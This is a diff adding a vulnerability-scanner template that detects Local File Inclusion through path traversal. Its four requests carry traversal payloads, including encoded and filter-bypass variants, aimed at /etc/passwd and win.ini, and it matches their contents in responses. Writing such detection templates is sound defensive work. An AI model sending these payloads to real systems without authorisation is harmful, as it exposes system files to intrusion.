@@ -1,0 +1,66 @@
+id: http-lfi-detection
+info:
+  name: "Local File Inclusion (LFI) Detection"
+  severity: "High"
+  description: "Detects LFI vulnerabilities by attempting to read sensitive files through path traversal in URL parameters."
+  compliance:
+    owasp: "A01:2021"
+    cwe: "CWE-98"
+requests:
+  - method: GET
+    path: "/page?file=../../../etc/passwd"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "bin:.*:1:1:"
+          - "daemon:.*:2:2:"
+          - "nobody:.*:65534:"
+      - type: status
+        part: status
+        status:
+          - 200
+    matcher_condition: and
+
+  - method: GET
+    path: "/download?file=..\\..\\..\\windows\\win.ini"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "[fonts]"
+          - "[extensions]"
+          - "[files]"
+          - "for 16-bit app support"
+      - type: status
+        part: status
+        status:
+          - 200
+    matcher_condition: or
+
+  - method: GET
+    path: "/static/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+      - type: status
+        part: status
+        status:
+          - 200
+    matcher_condition: and
+
+  - method: GET
+    path: "/template?name=....//....//....//etc/passwd"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+      - type: status
+        part: status
+        status:
+          - 200
+    matcher_condition: and
